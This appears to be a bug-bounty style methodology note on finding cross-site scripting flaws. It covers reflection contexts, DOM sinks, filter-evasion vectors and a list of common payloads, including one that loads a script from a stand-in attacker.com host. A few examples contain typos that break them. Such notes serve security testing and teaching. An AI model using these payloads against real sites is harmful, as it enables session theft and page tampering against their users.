@@ -1,0 +1,82 @@
+Hunting For XSS "Cross Site Scripting"
+
+---Reflected and Stored---
+1- Identify every endpoint where data is reflected
+- Includes parameters or other data within the url query string and message body , and the URl file path and also HTTP headers 
+- Say a user input field seems to accept only numeric values on the 
+web page, such as the age parameter in this POST request:
+ POST /edit_user_age
+ (Post request body)
+ age=20
+- Changing the input value:
+ POST /edit_user_age
+ (Post request body)
+ age=<script>alert('XSS by 1yz02');</script>
+
+2-  Monitor the application's responses for the apperance of this string " See if it reflect or not "
+- Determine the reflection context 
+- Test candidate payloads 
+- Test the attack in the browser 
+
+3- Defense Evasion 
+- Determine which tags / event handlers are allowed "Run a brute force if allowed"
+- If Quotes are not allowed use the fromCharCode method in javascript to ceate your XSS vector :
+<IMG SRC=javascript:alert(string.fromCharCode(88,83,83))>
+-If specific strings are note allowed use space embedding :
+<IMG SRC="jav acsript:alert('XSS');">
+--- You can know more from here : https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
+-----------------------------------------------------
+
+---DOM-based---
+- Review every piece of client-side javascript for sinks that may be used to access the DOM and can be controlled by client-supplied input 
+- Examples sinks include:
+ document.write()
+ document.writeln()
+ document.domain() ... etc
+- Ones you identify a source that leads to a sink , supply a unique string and use developer tools to follow the path of execution to the sink
+- Test candidate payloads 
+- Test the attack in the browser 
+
+-----------------------------------------------------
+
+- A tag attribute value :
+ <input type"text" name="address1" value="test123">
+- The Exploitation :
+ <input type"text" name="address1" value="test123"> <script>alert(1)</script>">
+ <input type"text" name="address1" value="test123" onfocus="alert(1)">
+
+- A Javascript string :
+ <script>var a = 'test123'; var b = 123; ... </script>
+- The Exploitation :
+ <script>var a = 'test123'; alert(1); var foo=''; var b = 123; ... </script>
+
+- An Attribute Containing a URL :
+ <a href="test123">Click here .. </a>
+- The Exploitation :
+ <a href="javascript:alert(1)">Click here .. </a>
+ <a href="#" onclick="javascript:alert(1)">Click here .. </a>
+
+-----------------------------------------------------
+- Common XSS payloads :
+ <script>alert(1)</script> ---  This is the most generic XSS payload . It will generate a popup box if the payload succeeds 
+ 
+ <iframe src=javascript:alert(1)> --- This payload loads JavaScript code within an iframe . It’s useful when <script> tags are banned by the XSS filter
+ 
+ <body onload=alert(1)> ---  This payload is useful when your input string can’t contain the term script . It inserts an HTML element that will run JavaScript automatically after it’s loaded 
+ 
+ "><img src=x onerror=prompt(1);> ---  This payload closes out the previous tag . It then injects an <img> tag with an invalid source URL . Once the tag fails to load, it will run the JavaScript specified in the onerror attribute 
+ 
+ <script>alert(1)<!- --- <!- is the start of an HTML comment . This payload will comment out the rest of the line in the HTML document to prevent syntax errors 
+
+ <a onmouseover"alert(1)">test</a> --- This payload inserts a link that will cause JavaScript to execute after a user hovers over the link with their cursor 
+ 
+ <script src=//attacker.com/test.js> --- This payload causes the browser to load and run an external script hosted on the attacker’s server 
+
+
+
+
+
+
+
+ 
